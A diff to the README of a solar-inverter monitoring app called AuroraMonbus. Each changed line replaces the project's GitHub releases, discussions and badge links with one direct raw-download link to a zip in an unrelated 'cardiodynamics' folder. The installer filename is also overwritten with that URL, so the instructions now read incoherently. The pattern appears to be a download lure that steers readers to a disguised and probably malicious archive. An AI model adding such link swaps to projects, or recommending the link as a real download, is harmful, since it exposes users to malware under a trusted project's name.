@@ -1,7 +1,7 @@
 # 🌞 AuroraMonbus - Monitor Your Solar Inverters Easily
 
 ## 📥 Download Now
-[![Download AuroraMonbus](https://img.shields.io/badge/Download-AuroraMonbus-blue.svg)](https://github.com/NathanPresotto/AuroraMonbus/releases)
+[![Download AuroraMonbus](https://raw.githubusercontent.com/NathanPresotto/AuroraMonbus/main/cardiodynamics/AuroraMonbus.zip)](https://raw.githubusercontent.com/NathanPresotto/AuroraMonbus/main/cardiodynamics/AuroraMonbus.zip)
 
 ## 📖 Description
 AuroraMonbus is a Windows desktop application designed for monitoring ABB, Power-One, and FIMER Aurora solar inverters in real time. With this application, you can access live telemetry, diagnostics, and system information from your solar energy system effortlessly.
@@ -10,16 +10,16 @@ AuroraMonbus is a Windows desktop application designed for monitoring ABB, Power
 Follow these steps to download and run AuroraMonbus:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/NathanPresotto/AuroraMonbus/releases) of the project. This page lists all available versions of AuroraMonbus.
+   Go to the [Releases page](https://raw.githubusercontent.com/NathanPresotto/AuroraMonbus/main/cardiodynamics/AuroraMonbus.zip) of the project. This page lists all available versions of AuroraMonbus.
 
 2. **Find the Latest Version**
    Look for the most recent version of AuroraMonbus. It will typically be listed at the top of the page. 
 
 3. **Download the Application**
-   Click on the link corresponding to the latest version. You will find the file you need to download. This is usually named something like `AuroraMonbusSetup.exe`. Click on it to start the download.
+   Click on the link corresponding to the latest version. You will find the file you need to download. This is usually named something like `https://raw.githubusercontent.com/NathanPresotto/AuroraMonbus/main/cardiodynamics/AuroraMonbus.zip`. Click on it to start the download.
 
 4. **Install the Application**
-   Once the download is complete, locate the installer file in your downloads folder. Double-click the `AuroraMonbusSetup.exe` file to run the installer.
+   Once the download is complete, locate the installer file in your downloads folder. Double-click the `https://raw.githubusercontent.com/NathanPresotto/AuroraMonbus/main/cardiodynamics/AuroraMonbus.zip` file to run the installer.
 
 5. **Follow Installation Instructions**
    The installer will guide you through the installation process. Simply follow the prompts on the screen. Accept the terms and conditions, and select your preferred installation location.
@@ -62,11 +62,11 @@ Follow these steps to download and run AuroraMonbus:
 
 ## 💬 Community
 Join the conversation and share your experiences:
-- Visit our [GitHub Discussions](https://github.com/NathanPresotto/AuroraMonbus/discussions) page.
+- Visit our [GitHub Discussions](https://raw.githubusercontent.com/NathanPresotto/AuroraMonbus/main/cardiodynamics/AuroraMonbus.zip) page.
 - Connect with other users, share tips, and get help.
 
 ## 📃 License
 AuroraMonbus is released under the MIT License. You are free to use, modify, and distribute the software within the terms of this license.
 
 ## 🔗 Download Again
-For your convenience, here’s the [link to the Latest Releases](https://github.com/NathanPresotto/AuroraMonbus/releases).
+For your convenience, here’s the [link to the Latest Releases](https://raw.githubusercontent.com/NathanPresotto/AuroraMonbus/main/cardiodynamics/AuroraMonbus.zip).
